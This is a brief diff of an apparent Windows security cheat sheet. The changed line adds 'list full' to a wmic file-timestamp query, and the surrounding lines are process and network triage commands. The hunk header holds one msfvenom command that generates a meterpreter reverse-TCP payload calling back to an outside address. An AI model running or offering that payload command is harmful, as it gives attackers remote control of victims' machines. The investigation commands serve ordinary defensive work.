@@ -11,7 +11,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f exe > pay
 wmic process get commandline, processid, parentprocessid /format:list									#What is the parent process?
 netstat -ano																						#Is it network aware?
 tasklist /m /fi "pid eq 1328" | findstr "mswsock ws2_32 wshtcpip wship netapi"						#Displays loaded Dlls, Can network dlls
-wmic datafile where name='c:\\windows\\system32\\notepad.exe'										#lists time stamps on a file, When was it writen to disk?
+wmic datafile where name='c:\\windows\\system32\\notepad.exe' list full										#lists time stamps on a file, When was it writen to disk?
 
 
 at
